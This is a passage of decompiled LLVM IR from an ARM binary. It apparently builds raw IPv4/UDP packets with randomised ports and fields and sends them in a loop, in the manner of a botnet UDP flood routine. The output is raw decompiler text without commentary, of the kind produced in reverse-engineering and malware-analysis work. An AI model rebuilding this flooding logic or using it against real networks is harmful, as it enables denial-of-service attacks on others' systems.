dec_label_pc_d8e8:                                ; preds = %dec_label_pc_d8c0
  %v0_d8e8 = load i32, i32* @r4, align 4
  %v3_d8e8 = mul i32 %v0_d8e8, 65536
  store i32 %v3_d8e8, i32* @lr, align 4
  %v0_d8ec = load i32, i32* @r7, align 4
  %v0_d8f0 = load i32, i32* @r6, align 4
  %v3_d8f0 = mul i32 %v0_d8f0, 65536
  store i32 %v3_d8f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_d8f8 = urem i32 %v0_d8ec, 65536
  %v3_d8fc = urem i32 %v0_d8f0, 65536
  store i32 %v3_d8fc, i32* %r2.global-to-local, align 4
  %v3_d900 = urem i32 %v0_d8e8, 65536
  store i32 %v3_d900, i32* %r3.global-to-local, align 4
  %v0_d904 = load i32, i32* %sb.global-to-local, align 4
  %v2_d904 = icmp eq i32 %v0_d904, 0
  store i1 %v2_d904, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp50 = icmp slt i32 %v0_d904, 1
  br i1 %tmp50, label %dec_label_pc_da88, label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d8e8
  %v1_d920 = urem i32 %v0_d8e8, 256
  %v1_d924 = urem i32 %v0_d8ec, 256
  %v3_d928 = mul nuw nsw i32 %v1_d920, 256
  %v1_d92c = urem i32 %v0_d8f0, 256
  %tmp51 = udiv i32 %v0_d8ec, 256
  %v3_d930 = urem i32 %tmp51, 256
  %tmp52 = udiv i32 %v0_d8f0, 256
  %v3_d934 = urem i32 %tmp52, 256
  store i32 %v3_d934, i32* %ip.global-to-local, align 4
  %v4_d938 = mul nuw nsw i32 %v1_d924, 256
  %v5_d938 = or i32 %v4_d938, %v3_d930
  store i32 %v5_d938, i32* @r7, align 4
  %v4_d93c = mul nuw nsw i32 %v1_d92c, 256
  %v5_d93c = or i32 %v4_d93c, %v3_d934
  store i32 %v5_d93c, i32* @r6, align 4
  %tmp53 = udiv i32 %v0_d8e8, 256
  %v4_d940 = urem i32 %tmp53, 256
  %v5_d940 = or i32 %v4_d940, %v3_d928
  store i32 %v5_d940, i32* @r5, align 4
  store i32 %v1_d92c, i32* %r2.global-to-local, align 4
  store i32 %v1_d920, i32* %r3.global-to-local, align 4
  %v2_d9bc = icmp eq i32 %v1_d850, 0
  %v4_d9c0 = sext i8 %v5_d840 to i32
  %sext = mul i32 %v0_d8ec, 16777216
  %v4_d9dc = sdiv i32 %sext, 16777216
  %sext6 = mul i32 %v0_d8f0, 16777216
  %v4_da38 = sdiv i32 %sext6, 16777216
  %sext7 = mul i32 %v0_d8e8, 16777216
  %v4_da58 = sdiv i32 %sext7, 16777216
  br label %dec_label_pc_d95c

dec_label_pc_d95c:                                ; preds = %bb57, %dec_label_pc_d91c
  %v2_d964 = call i32 @function_14294(i32 128, i32 1)
  store i32 %v2_d7d0, i32* %r2.global-to-local, align 4
  %v3_d96c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d96c, i32* %r3.global-to-local, align 4
  %v2_d970 = load i32, i32* @r4, align 4
  %v5_d970 = mul i32 %v2_d970, 4
  %v6_d970 = add i32 %v5_d970, %v2_d7d0
  %v7_d970 = inttoptr i32 %v6_d970 to i32*
  store i32 %v2_d964, i32* %v7_d970, align 4
  %v0_d974 = load i32, i32* %r2.global-to-local, align 4
  %v1_d974 = load i32, i32* %r3.global-to-local, align 4
  %v4_d974 = mul i32 %v1_d974, 4
  %v5_d974 = add i32 %v4_d974, %v0_d974
  %v6_d974 = inttoptr i32 %v5_d974 to i32*
  %v7_d974 = load i32, i32* %v6_d974, align 4
  store i32 %v7_d974, i32* @lr, align 4
  %v1_d978 = inttoptr i32 %v7_d974 to i8*
  %v2_d978 = load i8, i8* %v1_d978, align 1
  %tmp = urem i8 %v2_d978, 16
  %v1_d97c = zext i8 %tmp to i32
  %v1_d980 = or i32 %v1_d97c, 64
  store i32 %v1_d980, i32* %r3.global-to-local, align 4
  %v1_d984 = trunc i32 %v1_d980 to i8
  store i8 %v1_d984, i8* %v1_d978, align 1
  %v0_d988 = load i32, i32* @lr, align 4
  %v1_d988 = inttoptr i32 %v0_d988 to i8*
  %v2_d988 = load i8, i8* %v1_d988, align 1
  %v1_d98c = and i8 %v2_d988, -16
  %v1_d990 = or i8 %v1_d98c, 5
  store i8 %v1_d990, i8* %v1_d988, align 1
  %v2_d99c = load i32, i32* @lr, align 4
  %v3_d99c = add i32 %v2_d99c, 1
  %v4_d99c = inttoptr i32 %v3_d99c to i8*
  store i8 %v5_d808, i8* %v4_d99c, align 1
  %v3_d9a0 = load i32, i32* %stack_var_-44, align 4
  %v1_d9a4 = add i32 %v3_d9a0, 32
  %tmp54 = mul i32 %v1_d9a4, 256
  %v1_d9b0 = and i32 %tmp54, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp55 = udiv i32 %v1_d9a4, 256
  %v4_d9b4 = urem i32 %tmp55, 256
  %v5_d9b4 = or i32 %v4_d9b4, %v1_d9b0
  store i32 %v5_d9b4, i32* %r2.global-to-local, align 4
  store i1 %v2_d9bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_d9c0, i32* %r3.global-to-local, align 4
  %v2_d9c4 = load i32, i32* @lr, align 4
  %v3_d9c4 = add i32 %v2_d9c4, 8
  %v4_d9c4 = inttoptr i32 %v3_d9c4 to i8*
  store i8 %v5_d840, i8* %v4_d9c4, align 1
  %v0_d9c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9c8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d95c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d9cc = load i32, i32* @lr, align 4
  %v4_d9cc = add i32 %v3_d9cc, 6
  %v5_d9cc = inttoptr i32 %v4_d9cc to i8*
  store i8 64, i8* %v5_d9cc, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d95c, %bb
  %v0_d9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d9d0 = trunc i32 %v0_d9d0 to i8
  %v2_d9d0 = load i32, i32* @lr, align 4
  %v3_d9d0 = add i32 %v2_d9d0, 2
  %v4_d9d0 = inttoptr i32 %v3_d9d0 to i8*
  store i8 %v1_d9d0, i8* %v4_d9d0, align 1
  %v0_d9d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d9d4 = sdiv i32 %v0_d9d4, 256
  store i32 %v3_d9d4, i32* %ip.global-to-local, align 4
  store i32 %v4_d9dc, i32* %r2.global-to-local, align 4
  %v2_d9e0 = load i32, i32* @lr, align 4
  %v3_d9e0 = add i32 %v2_d9e0, 9
  %v4_d9e0 = inttoptr i32 %v3_d9e0 to i8*
  store i8 17, i8* %v4_d9e0, align 1
  store i32 ptrtoint (i32* @global_var_1ecb8.86 to i32), i32* %r3.global-to-local, align 4
  %v0_d9e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d9e8 = trunc i32 %v0_d9e8 to i8
  %v2_d9e8 = load i32, i32* @lr, align 4
  %v3_d9e8 = add i32 %v2_d9e8, 5
  %v4_d9e8 = inttoptr i32 %v3_d9e8 to i8*
  store i8 %v1_d9e8, i8* %v4_d9e8, align 1
  %v0_d9ec = load i32, i32* %ip.global-to-local, align 4
  %v1_d9ec = trunc i32 %v0_d9ec to i8
  %v2_d9ec = load i32, i32* @lr, align 4
  %v3_d9ec = add i32 %v2_d9ec, 3
  %v4_d9ec = inttoptr i32 %v3_d9ec to i8*
  store i8 %v1_d9ec, i8* %v4_d9ec, align 1
  %v0_d9f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9f0, label %.thread8, label %bb56

.thread8:                                         ; preds = %.thread
  %v3_d9f49 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9f49, i32* %ip.global-to-local, align 4
  br label %bb57

bb56:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d9f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9f4, i32* %ip.global-to-local, align 4
  %v3_d9f8 = load i32, i32* @lr, align 4
  %v4_d9f8 = add i32 %v3_d9f8, 7
  %v5_d9f8 = inttoptr i32 %v4_d9f8 to i8*
  store i8 0, i8* %v5_d9f8, align 1
  %v0_da00.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %bb56
  %v0_da00 = phi i32 [ %v3_d9f49, %.thread8 ], [ %v0_da00.pre, %bb56 ]
  %v2_d9fc = load i32, i32* @global_var_1ecb8.86, align 4
  store i32 %v2_d9fc, i32* %r2.global-to-local, align 4
  %v3_da00 = mul i32 %v0_da00, 32
  store i32 %v3_da00, i32* %r3.global-to-local, align 4
  %v1_da04 = load i32, i32* @lr, align 4
  %v2_da04 = add i32 %v1_da04, 12
  %v3_da04 = inttoptr i32 %v2_da04 to i32*
  store i32 %v2_d9fc, i32* %v3_da04, align 4
  %v0_da08 = load i32, i32* %r3.global-to-local, align 4
  %v1_da08 = load i32, i32* %ip.global-to-local, align 4
  %tmp60 = mul i32 %v1_da08, -8
  %v5_da08 = add i32 %v0_da08, %tmp60
  %v1_da0c = load i32, i32* @sl, align 4
  %v2_da0c = add i32 %v5_da08, %v1_da0c
  store i32 %v2_da0c, i32* %r3.global-to-local, align 4
  %v1_da10 = add i32 %v2_da0c, 16
  %v2_da10 = inttoptr i32 %v1_da10 to i32*
  %v3_da10 = load i32, i32* %v2_da10, align 4
  %v1_da14 = load i32, i32* @lr, align 4
  %v2_da14 = add i32 %v1_da14, 16
  %v3_da14 = inttoptr i32 %v2_da14 to i32*
  store i32 %v3_da10, i32* %v3_da14, align 4
  %v3_da18 = load i32, i32* %stack_var_-44, align 4
  %v1_da1c = add i32 %v3_da18, 12
  %tmp58 = mul i32 %v1_da1c, 256
  %v1_da2c = and i32 %tmp58, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp59 = udiv i32 %v1_da1c, 256
  %v4_da30 = urem i32 %tmp59, 256
  %v5_da30 = or i32 %v4_da30, %v1_da2c
  store i32 %v5_da30, i32* %ip.global-to-local, align 4
  %v1_da34 = load i32, i32* @lr, align 4
  %v2_da34 = add i32 %v1_da34, 28
  %v3_da34 = inttoptr i32 %v2_da34 to i32*
  store i32 -1, i32* %v3_da34, align 4
  store i32 %v4_da38, i32* %r2.global-to-local, align 4
  %v0_da3c = load i32, i32* @lr, align 4
  %v1_da3c = add i32 %v0_da3c, 20
  store i32 %v1_da3c, i32* %r4.global-to-local, align 4
  %v0_da40 = load i32, i32* %ip.global-to-local, align 4
  %v3_da40 = sdiv i32 %v0_da40, 256
  store i32 %v3_da40, i32* %r3.global-to-local, align 4
  %v0_da44 = load i32, i32* @r7, align 4
  %v1_da44 = trunc i32 %v0_da44 to i8
  %v3_da44 = add i32 %v0_da3c, 4
  %v4_da44 = inttoptr i32 %v3_da44 to i8*
  store i8 %v1_da44, i8* %v4_da44, align 1
  %v0_da48 = load i32, i32* @r6, align 4
  %v1_da48 = trunc i32 %v0_da48 to i8
  %v2_da48 = load i32, i32* @lr, align 4
  %v3_da48 = add i32 %v2_da48, 20
  %v4_da48 = inttoptr i32 %v3_da48 to i8*
  store i8 %v1_da48, i8* %v4_da48, align 1
  %v0_da4c = load i32, i32* %r3.global-to-local, align 4
  %v1_da4c = trunc i32 %v0_da4c to i8
  %v2_da4c = load i32, i32* %r4.global-to-local, align 4
  %v3_da4c = add i32 %v2_da4c, 5
  %v4_da4c = inttoptr i32 %v3_da4c to i8*
  store i8 %v1_da4c, i8* %v4_da4c, align 1
  %v0_da50 = load i32, i32* @r5, align 4
  %v1_da50 = trunc i32 %v0_da50 to i8
  %v2_da50 = load i32, i32* %r4.global-to-local, align 4
  %v3_da50 = add i32 %v2_da50, 2
  %v4_da50 = inttoptr i32 %v3_da50 to i8*
  store i8 %v1_da50, i8* %v4_da50, align 1
  %v0_da54 = load i32, i32* %r2.global-to-local, align 4
  %v1_da54 = trunc i32 %v0_da54 to i8
  %v2_da54 = load i32, i32* %r4.global-to-local, align 4
  %v3_da54 = add i32 %v2_da54, 1
  %v4_da54 = inttoptr i32 %v3_da54 to i8*
  store i8 %v1_da54, i8* %v4_da54, align 1
  store i32 %v4_da58, i32* %r3.global-to-local, align 4
  %v0_da5c = load i32, i32* %ip.global-to-local, align 4
  %v1_da5c = trunc i32 %v0_da5c to i8
  %v2_da5c = load i32, i32* %r4.global-to-local, align 4
  %v3_da5c = add i32 %v2_da5c, 4
  %v4_da5c = inttoptr i32 %v3_da5c to i8*
  store i8 %v1_da5c, i8* %v4_da5c, align 1
  %v0_da60 = load i32, i32* %r3.global-to-local, align 4
  %v1_da60 = trunc i32 %v0_da60 to i8
  %v2_da60 = load i32, i32* %r4.global-to-local, align 4
  %v3_da60 = add i32 %v2_da60, 3
  %v4_da60 = inttoptr i32 %v3_da60 to i8*
  store i8 %v1_da60, i8* %v4_da60, align 1
  %v0_da64 = load i32, i32* %r8.global-to-local, align 4
  %v0_da68 = load i32, i32* @lr, align 4
  %v1_da68 = add i32 %v0_da68, 32
  %v3_da6c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da6c, i32* %r2.global-to-local, align 4
  %v3_da70 = call i32 @function_12d58(i32 %v1_da68, i32 %v0_da64, i32 %v3_da6c)
  %v3_da74 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da74, i32* %r3.global-to-local, align 4
  %v1_da78 = add i32 %v3_da74, 1
  store i32 %v1_da78, i32* @r4, align 4
  %v1_da7c = load i32, i32* %sb.global-to-local, align 4
  %v9_da7c = icmp eq i32 %v1_da78, %v1_da7c
  store i1 %v9_da7c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_da78, i32* %stack_var_-40, align 4
  %v5_da84 = icmp slt i32 %v1_da78, %v1_da7c
  br i1 %v5_da84, label %dec_label_pc_d95c, label %dec_label_pc_da88

dec_label_pc_da88:                                ; preds = %bb57, %dec_label_pc_d8e8
  %v0_da88 = phi i32 [ %v0_d904, %dec_label_pc_d8e8 ], [ %v1_da7c, %bb57 ]
  %v2_da88 = icmp eq i32 %v0_da88, 0
  store i1 %v2_da88, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dad0 = icmp eq i32 %v3_d8f8, 65535
  br label %dec_label_pc_da90.outer

dec_label_pc_da90.outer:                          ; preds = %dec_label_pc_dba0, %dec_label_pc_da88
  %v1_da90.ph.in = phi i32 [ %v1_db94, %dec_label_pc_dba0 ], [ %v0_da88, %dec_label_pc_da88 ]
  %v0_da90.ph = phi i1 [ %v2_dba0, %dec_label_pc_dba0 ], [ %v2_da88, %dec_label_pc_da88 ]
  %v1_da90.ph = icmp slt i32 %v1_da90.ph.in, 0
  %v4_da90 = or i1 %v1_da90.ph, %v0_da90.ph
  br label %dec_label_pc_da90

dec_label_pc_da90:                                ; preds = %dec_label_pc_da90.outer, %dec_label_pc_da90
  br i1 %v4_da90, label %dec_label_pc_da90, label %dec_label_pc_da94

dec_label_pc_da94:                                ; preds = %dec_label_pc_da90
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_daa0

dec_label_pc_daa0:                                ; preds = %dec_label_pc_daf0, %dec_label_pc_da94
  %v1_dab4 = phi i32 [ %v1_db90, %dec_label_pc_daf0 ], [ 0, %dec_label_pc_da94 ]
  %v5_daa4 = mul i32 %v1_dab4, 24
  %v1_daa8 = load i32, i32* @sl, align 4
  %v2_daa8 = add i32 %v1_daa8, %v5_daa4
  store i32 %v2_daa8, i32* %r3.global-to-local, align 4
  %v1_dab0 = add i32 %v2_daa8, 20
  %v2_dab0 = inttoptr i32 %v1_dab0 to i8*
  %v3_dab0 = load i8, i8* %v2_dab0, align 1
  %v4_dab0 = zext i8 %v3_dab0 to i32
  store i32 %v4_dab0, i32* %r2.global-to-local, align 4
  %v4_dab4 = mul i32 %v1_dab4, 4
  %v5_dab4 = add i32 %v4_dab4, %v2_d7d0
  %v6_dab4 = inttoptr i32 %v5_dab4 to i32*
  %v7_dab4 = load i32, i32* %v6_dab4, align 4
  store i32 %v7_dab4, i32* @r5, align 4
  %v7_dabc = icmp eq i8 %v3_dab0, 31
  store i1 %v7_dabc, i1* %cpsr_z.global-to-local, align 1
  store i32 65535, i32* %r7.global-to-local, align 4
  %v1_dac4 = add i32 %v7_dab4, 20
  store i32 %v1_dac4, i32* @r6, align 4
  %tmp61 = icmp ult i8 %v3_dab0, 32
  br i1 %tmp61, label %dec_label_pc_dbac, label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_daa0
  store i32 %v3_d8f8, i32* %r2.global-to-local, align 4
  store i1 %v3_dad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_dad0, label %dec_label_pc_dc14, label %dec_label_pc_dad8

dec_label_pc_dad8:                                ; preds = %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge, %dec_label_pc_dacc
  %v1_dadc = phi i32 [ %v1_dadc.pre, %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge ], [ 65535, %dec_label_pc_dacc ]
  store i32 %v3_d8fc, i32* %r3.global-to-local, align 4
  %v9_dadc = icmp eq i32 %v3_d8fc, %v1_dadc
  store i1 %v9_dadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dadc, label %dec_label_pc_dc30, label %dec_label_pc_dae4

dec_label_pc_dae4:                                ; preds = %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge, %dec_label_pc_dad8
  %v1_dae8 = phi i32 [ %v1_dae8.pre, %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge ], [ %v1_dadc, %dec_label_pc_dad8 ]
  %v9_dae8 = icmp eq i32 %v3_d900, %v1_dae8
  store i1 %v9_dae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dae8, label %dec_label_pc_dc4c, label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_dae4, %dec_label_pc_dc4c
  %v0_daf4 = load i32, i32* %r8.global-to-local, align 4
  %v1_daf4 = trunc i32 %v0_daf4 to i8
  %v2_daf4 = load i32, i32* @r5, align 4
  %v3_daf4 = add i32 %v2_daf4, 10
  %v4_daf4 = inttoptr i32 %v3_daf4 to i8*
  store i8 %v1_daf4, i8* %v4_daf4, align 1
  %v0_daf8 = load i32, i32* %r8.global-to-local, align 4
  %v1_daf8 = trunc i32 %v0_daf8 to i8
  %v2_daf8 = load i32, i32* @r5, align 4
  %v3_daf8 = add i32 %v2_daf8, 11
  %v4_daf8 = inttoptr i32 %v3_daf8 to i8*
  store i8 %v1_daf8, i8* %v4_daf8, align 1
  %v0_dafc = load i32, i32* @r5, align 4
  store i32 %v0_dafc, i32* @r0, align 4
  %v2_db00 = call i32 @function_e424(i32 %v0_dafc, i32 20)
  %v3_db00 = trunc i32 %v2_db00 to i8
  %v4_db04 = sdiv i32 %v2_db00, 256
  store i32 %v4_db04, i32* %r3.global-to-local, align 4
  %v1_db08 = trunc i32 %v4_db04 to i8
  %v2_db08 = load i32, i32* @r5, align 4
  %v3_db08 = add i32 %v2_db08, 11
  %v4_db08 = inttoptr i32 %v3_db08 to i8*
  store i8 %v1_db08, i8* %v4_db08, align 1
  %v3_db0c = load i32, i32* @r5, align 4
  %v4_db0c = add i32 %v3_db0c, 10
  %v5_db0c = inttoptr i32 %v4_db0c to i8*
  store i8 %v3_db00, i8* %v5_db0c, align 1
  %v0_db10 = load i32, i32* %r8.global-to-local, align 4
  %v1_db10 = trunc i32 %v0_db10 to i8
  %v2_db10 = load i32, i32* @r6, align 4
  %v3_db10 = add i32 %v2_db10, 6
  %v4_db10 = inttoptr i32 %v3_db10 to i8*
  store i8 %v1_db10, i8* %v4_db10, align 1
  %v0_db14 = load i32, i32* %r8.global-to-local, align 4
  %v1_db14 = trunc i32 %v0_db14 to i8
  %v2_db14 = load i32, i32* @r6, align 4
  %v3_db14 = add i32 %v2_db14, 7
  %v4_db14 = inttoptr i32 %v3_db14 to i8*
  store i8 %v1_db14, i8* %v4_db14, align 1
  %v0_db18 = load i32, i32* @r5, align 4
  %v1_db18 = add i32 %v0_db18, 24
  %v2_db18 = inttoptr i32 %v1_db18 to i8*
  %v3_db18 = load i8, i8* %v2_db18, align 1
  %v4_db18 = zext i8 %v3_db18 to i32
  store i32 %v4_db18, i32* %r3.global-to-local, align 4
  %v1_db1c = add i32 %v0_db18, 25
  %v2_db1c = inttoptr i32 %v1_db1c to i8*
  %v3_db1c = load i8, i8* %v2_db1c, align 1
  %v4_db1c = zext i8 %v3_db1c to i32
  %v4_db20 = mul nuw nsw i32 %v4_db1c, 256
  %v5_db20 = or i32 %v4_db20, %v4_db18
  store i32 %v5_db20, i32* %r2.global-to-local, align 4
  %v3_db24 = load i32, i32* %stack_var_-44, align 4
  %v0_db28 = load i32, i32* @r6, align 4
  store i32 %v0_db28, i32* @r1, align 4
  %v1_db2c = add i32 %v3_db24, 12
  store i32 %v1_db2c, i32* %r3.global-to-local, align 4
  %v4_db34 = call i32 @function_e480(i32 %v0_db18, i32 %v0_db28, i32 %v5_db20, i32 %v1_db2c)
  %v5_db34 = trunc i32 %v4_db34 to i8
  %v4_db3824 = udiv i32 %v4_db34, 256
  %v1_db3c = trunc i32 %v4_db3824 to i8
  %v2_db3c = load i32, i32* @r6, align 4
  %v3_db3c = add i32 %v2_db3c, 7
  %v4_db3c = inttoptr i32 %v3_db3c to i8*
  store i8 %v1_db3c, i8* %v4_db3c, align 1
  %v3_db40 = load i32, i32* @r6, align 4
  %v4_db40 = add i32 %v3_db40, 6
  %v5_db40 = inttoptr i32 %v4_db40 to i8*
  store i8 %v5_db34, i8* %v5_db40, align 1
  %v3_db44 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_db44, i32* %r3.global-to-local, align 4
  %v0_db48 = load i32, i32* @r5, align 4
  %v1_db48 = add i32 %v0_db48, 20
  %v2_db48 = inttoptr i32 %v1_db48 to i32*
  %v3_db48 = load i32, i32* %v2_db48, align 4
  %v5_db50 = mul i32 %v3_db44, 24
  %v1_db54 = load i32, i32* @sl, align 4
  %v2_db54 = add i32 %v1_db54, %v5_db50
  store i32 %v2_db54, i32* %ip.global-to-local, align 4
  %v3_db58 = udiv i32 %v3_db48, 65536
  store i32 %v3_db58, i32* %r2.global-to-local, align 4
  %v1_db5c = trunc i32 %v3_db58 to i8
  %v3_db5c = add i32 %v2_db54, 2
  %v4_db5c = inttoptr i32 %v3_db5c to i8*
  store i8 %v1_db5c, i8* %v4_db5c, align 1
  %v0_db60 = load i32, i32* %r2.global-to-local, align 4
  %v3_db6025 = udiv i32 %v0_db60, 256
  %v3_db64 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_db64, i32* %r2.global-to-local, align 4
  %v1_db68 = trunc i32 %v3_db6025 to i8
  %v2_db68 = load i32, i32* %ip.global-to-local, align 4
  %v3_db68 = add i32 %v2_db68, 3
  %v4_db68 = inttoptr i32 %v3_db68 to i8*
  store i8 %v1_db68, i8* %v4_db68, align 1
  %v0_db6c = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_db74 = load i32, i32* %r2.global-to-local, align 4
  %v1_db74 = add i32 %v0_db74, 32
  store i32 %v1_db74, i32* %r2.global-to-local, align 4
  %v0_db78 = load i32, i32* %fp.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_db80 = load i32, i32* %ip.global-to-local, align 4
  %v6_db88 = inttoptr i32 %v0_db6c to i32*
  %v7_db88 = call i32 @function_13f2c(i32 %v0_db78, i32* %v6_db88, i32 %v1_db74, i32 16384, i32 %v0_db80, i32 16)
  %v3_db8c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_db8c, i32* %r3.global-to-local, align 4
  %v1_db90 = add i32 %v3_db8c, 1
  %v1_db94 = load i32, i32* %sb.global-to-local, align 4
  %v9_db94 = icmp eq i32 %v1_db90, %v1_db94
  store i1 %v9_db94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_db90, i32* %stack_var_-40, align 4
  %v5_db9c = icmp slt i32 %v1_db90, %v1_db94
  br i1 %v5_db9c, label %dec_label_pc_daa0, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_daf0
  %v2_dba0 = icmp eq i32 %v1_db94, 0
  store i1 %v2_dba0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da90.outer

dec_label_pc_dbac:                                ; preds = %dec_label_pc_daa0
  %v1_dbac = add i32 %v2_daa8, 16
  %v2_dbac = inttoptr i32 %v1_dbac to i32*
  %v3_dbac = load i32, i32* %v2_dbac, align 4
  store i32 %v3_dbac, i32* @r4, align 4
  %v0_dbb0 = call i32 @function_fe60()
  %v3_dbb4 = load i32, i32* %stack_var_-40, align 4
  %v5_dbbc = mul i32 %v3_dbb4, 24
  %v0_dbc0 = load i32, i32* @r4, align 4
  %v1_dbc4 = and i32 %v0_dbc0, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_dbc4, i32* %r3.global-to-local, align 4
  %v1_dbc0 = udiv i32 %v0_dbc0, 256
  %v3_dbc8 = and i32 %v1_dbc0, 65280
  store i32 %v3_dbc8, i32* %r2.global-to-local, align 4
  %v1_dbcc = load i32, i32* @sl, align 4
  %v2_dbcc = add i32 %v1_dbcc, %v5_dbbc
  store i32 %v2_dbcc, i32* %ip.global-to-local, align 4
  %v3_dbd0 = mul i32 %v0_dbc0, 16777216
  %v4_dbd4 = mul i32 %v1_dbc4, 256
  %v5_dbd4 = or i32 %v4_dbd4, %v3_dbd0
  %v1_dbd8 = add i32 %v2_dbcc, 20
  %v2_dbd8 = inttoptr i32 %v1_dbd8 to i8*
  %v3_dbd8 = load i8, i8* %v2_dbd8, align 1
  %v4_dbd8 = zext i8 %v3_dbd8 to i32
  %v4_dbdc = udiv i32 %v0_dbc0, 16777216
  %v5_dbdc = or i32 %v3_dbc8, %v4_dbdc
  %v2_dbe0 = or i32 %v5_dbdc, %v5_dbd4
  %v7_dbe4 = lshr i32 %v0_dbb0, %v4_dbd8
  %v8_dbe4 = add i32 %v7_dbe4, %v2_dbe0
  store i32 %v3_d8f8, i32* %r2.global-to-local, align 4
  %v2_dc04 = call i32 @llvm.bswap.i32(i32 %v8_dbe4)
  store i32 %v2_dc04, i32* %r3.global-to-local, align 4
  %v1_dc08 = load i32, i32* %r7.global-to-local, align 4
  %v9_dc08 = icmp eq i32 %v3_d8f8, %v1_dc08
  store i1 %v9_dc08, i1* %cpsr_z.global-to-local, align 1
  %v1_dc0c = load i32, i32* @r5, align 4
  %v2_dc0c = add i32 %v1_dc0c, 16
  %v3_dc0c = inttoptr i32 %v2_dc0c to i32*
  store i32 %v2_dc04, i32* %v3_dc0c, align 4
  br i1 %v9_dc08, label %dec_label_pc_dc14, label %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge

dec_label_pc_dbac.dec_label_pc_dad8_crit_edge:    ; preds = %dec_label_pc_dbac
  %v1_dadc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dad8

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dbac, %dec_label_pc_dacc
  %v0_dc14 = call i32 @function_fe60()
  %v1_dc14 = trunc i32 %v0_dc14 to i8
  %v4_dc1826 = udiv i32 %v0_dc14, 256
  %v1_dc1c = trunc i32 %v4_dc1826 to i8
  %v2_dc1c = load i32, i32* @r5, align 4
  %v3_dc1c = add i32 %v2_dc1c, 5
  %v4_dc1c = inttoptr i32 %v3_dc1c to i8*
  store i8 %v1_dc1c, i8* %v4_dc1c, align 1
  store i32 %v3_d8fc, i32* %r3.global-to-local, align 4
  %v1_dc24 = load i32, i32* %r7.global-to-local, align 4
  %v9_dc24 = icmp eq i32 %v3_d8fc, %v1_dc24
  store i1 %v9_dc24, i1* %cpsr_z.global-to-local, align 1
  %v3_dc28 = load i32, i32* @r5, align 4
  %v4_dc28 = add i32 %v3_dc28, 4
  %v5_dc28 = inttoptr i32 %v4_dc28 to i8*
  store i8 %v1_dc14, i8* %v5_dc28, align 1
  %v0_dc2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_dc2c, label %dec_label_pc_dc30, label %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge

dec_label_pc_dc14.dec_label_pc_dae4_crit_edge:    ; preds = %dec_label_pc_dc14
  %v1_dae8.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dae4

dec_label_pc_dc30:                                ; preds = %dec_label_pc_dc14, %dec_label_pc_dad8
  %v0_dc30 = call i32 @function_fe60()
  %v1_dc30 = trunc i32 %v0_dc30 to i8
  %v4_dc38 = sdiv i32 %v0_dc30, 256
  store i32 %v4_dc38, i32* %r3.global-to-local, align 4
  %v1_dc3c = load i32, i32* %r7.global-to-local, align 4
  %v9_dc3c = icmp eq i32 %v3_d900, %v1_dc3c
  store i1 %v9_dc3c, i1* %cpsr_z.global-to-local, align 1
  %v3_dc40 = load i32, i32* @r5, align 4
  %v4_dc40 = add i32 %v3_dc40, 20
  %v5_dc40 = inttoptr i32 %v4_dc40 to i8*
  store i8 %v1_dc30, i8* %v5_dc40, align 1
  %v0_dc44 = load i32, i32* %r3.global-to-local, align 4
  %v1_dc44 = trunc i32 %v0_dc44 to i8
  %v2_dc44 = load i32, i32* @r6, align 4
  %v3_dc44 = add i32 %v2_dc44, 1
  %v4_dc44 = inttoptr i32 %v3_dc44 to i8*
  store i8 %v1_dc44, i8* %v4_dc44, align 1
